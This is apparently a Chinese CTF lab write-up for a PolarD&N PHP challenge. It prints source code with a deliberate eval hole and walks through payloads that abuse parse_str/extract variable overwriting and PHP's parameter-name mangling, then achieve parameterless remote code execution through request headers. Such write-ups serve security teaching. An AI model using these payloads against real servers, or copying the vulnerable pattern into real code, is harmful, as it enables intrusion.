# PHP是世界上最好的语言-PolarD&N XXF无参数RCE QUERY_STRING 特性

这个靶场我之前看到过打广告，而且感觉比较新 来坐坐

```php
 <?php
//flag in $flag
highlight_file(__FILE__);
include("flag.php");
$c=$_POST['sys'];
$key1 = 0;
$key2 = 0;
if(isset($_GET['flag1']) || isset($_GET['flag2']) || isset($_POST['flag1']) || isset($_POST['flag2'])) {
    die("nonononono");
}
@parse_str($_SERVER['QUERY_STRING']);
extract($_POST);
if($flag1 == '8gen1' && $flag2 == '8gen1') {
    if(isset($_POST['504_SYS.COM'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\?/", $c)){
         eval("$c");  
 
    }
}
}
?> 
```

这里还是

## @parse_str($_SERVER['QUERY_STRING']);

这里存在特性

```cobol
?_POST[flag]=11111
 
通过extract($_POST);
 
 
会变为
 
 
$flag = 11111
```

所以第一个flag我们直接绕过了

```cobol
GET 传递?_POST[flag1]=8gen1&_POST[flag2]=8gen1
```

然后需要绕过

```php
    if(isset($_POST['504_SYS.COM'])){ 
```

通过 _ 就可以思考到非法参数了

```cobol
504[SYS.COM=1
```

然后我们就可以执行命令了

```perl
sys=system(ls);
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/b6bd4d4ce9f73841c958f466e5085bb0.png" alt="" style="max-height:473px; box-sizing:content-box;" />


payload

```cobol
?_POST[flag1]=8gen1&_POST[flag2]=8gen1
 
 
504[SYS.COM=1&sys=system(ls);
```

但是我们无法直接获取到flag 所以需要无参数rce因为过滤了 引号

 [无参数RCE绕过的详细总结（六种方法）_ctf rce绕过-CSDN博客](https://blog.csdn.net/2301_76690905/article/details/133808536) 

这里的方法都可以使用

这里使用一个XXF执行命令的

首先我们逆向打印请求头

```cobol
504[SYS.COM=1&sys=print_r(array_reverse(getallheaders()));
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/8e5ea32f283b93fc1d0466daf9d297a9.png" alt="" style="max-height:495px; box-sizing:content-box;" />


然后我们通过 pos 和eval 执行命令

pos 会输出当前数组的值 第一个是 xxf 就是ip 然后执行命令 我们将命令拼接即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/b82b403ec0252e18c5bb7059ae6260b2.png" alt="" style="max-height:176px; box-sizing:content-box;" />


这里还需要XXF后面的内容注释掉 不然无法执行